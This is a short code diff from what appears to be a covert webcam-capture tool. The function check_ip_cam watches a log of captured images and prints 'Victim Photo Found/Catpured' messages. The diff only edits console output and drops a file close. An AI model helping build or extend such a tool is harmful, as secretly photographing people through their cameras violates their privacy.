@@ -29,10 +29,8 @@ def check_ip_cam():
             return check_ip_cam()
         if images_log.exists():
             print("\n")
-            print(colored("[++] Victim Photo Found ", 'green'))
-            print(colored(f"[*] Photo Name : Victim{datetime.datetime.now()}", 'red'))
+            print(colored("[++] Victim Photo Found/Catpured ", 'green'))
             print("\n")
-            img_file.close()
             os.system('del images_log_info.log')
             return check_ip_cam()
 
